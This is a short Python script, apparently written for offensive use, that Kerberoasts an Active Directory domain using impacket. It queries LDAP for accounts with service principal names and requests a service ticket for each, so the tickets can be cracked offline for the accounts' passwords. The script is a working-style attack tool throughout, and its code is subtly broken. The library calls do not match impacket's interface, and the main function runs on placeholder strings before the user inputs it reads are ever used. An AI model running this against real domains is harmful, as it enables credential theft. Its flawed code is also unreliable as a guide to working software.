from impacket.ldap import LDAPConnection, LDAPSearchError
from impacket.krb5.kerberosv5 import getKerberosTGS

def find_kerberoastable_users(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        ldap_conn = LDAPConnection(dc_ip, username=f"{domain}\\{username}", password=password)
        ldap_conn.open()
        ldap_conn.bind()

        # Search for kerberoastable users (users with SPNs set)
        _, entries = ldap_conn.search(
            search_base=f"DC={','.join(domain.split('.'))}",
            search_filter="(servicePrincipalName=*)",
            attributes=["sAMAccountName"]
        )

        kerberoastable_users = [entry['sAMAccountName'] for _, entry in entries]

        ldap_conn.unbind()

        return kerberoastable_users

    except LDAPSearchError as e:
        print(f"LDAP Search Error: {e}")
        return []
    except Exception as e:
        print(f"Error while searching for kerberoastable users: {e}")
        return []

def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
    try:
        # Find all kerberoastable users
        kerberoastable_users = find_kerberoastable_users(username, password, domain, dc_ip)

        if not kerberoastable_users:
            print("No kerberoastable users found.")
            return

        # Perform Kerberoasting for each kerberoastable user
        for user in kerberoastable_users:
            print(f"Kerberoasting user: {user}")

            # Request Service Ticket (TGS) for the user
            tgs = getKerberosTGS(username, password, domain, domain, user, dc_ip)

            # Output the obtained TGS
            print(f"Kerberoast ticket for user {user}:\n{tgs}\n")

    except Exception as e:
        print(f"Error during Kerberoasting: {e}")
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")


# Example usage:
username = input("Enter username: ")
# usernameWithDomain = input("Enter your username in this format: DOMAIN/username")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")